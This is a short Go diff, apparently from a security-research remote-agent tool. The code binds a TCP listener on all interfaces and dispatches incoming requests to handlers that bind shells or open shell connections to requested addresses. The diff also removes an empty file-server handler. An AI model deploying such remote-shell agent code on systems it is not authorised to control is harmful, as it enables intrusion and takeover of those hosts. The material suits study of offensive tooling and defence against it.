@@ -20,7 +20,7 @@ func main() {
 	star.ParameterHandling()
 
 	// SECURITY RESEARCHER TODO: Configure default connections here
-	star.NewTCPListener(":42069")
+	star.NewTCPListener("0.0.0.0:42069")
 
 	// Send a "hello" message to any existing connections
 	helloMsg := star.NewMessageHello()
@@ -85,8 +85,6 @@ func AgentProcessMessage(msg *star.Message) {
 		AgentProcessShellBindRequest(msg)
 	case star.MessageTypeShellConnection:
 		AgentProcessShellConnectionRequest(msg)
-	case star.MessageTypeFileServer:
-		AgentProcessFileServerRequest(msg)
 	}
 }
 
@@ -234,15 +232,6 @@ func AgentProcessShellConnectionRequest(msg *star.Message) {
 	err := msg.GobDecodeMessage(&reqMsg)
 	if err == nil {
 		star.NewShellConnection(reqMsg.Address, reqMsg.Type, reqMsg.Requester)
-	}
-}
-
-func AgentProcessFileServerRequest(msg *star.Message) {
-	var reqMsg star.MessageFileServerRequest
-
-	err := msg.GobDecodeMessage(&reqMsg)
-	if err == nil {
-
 	}
 }
 
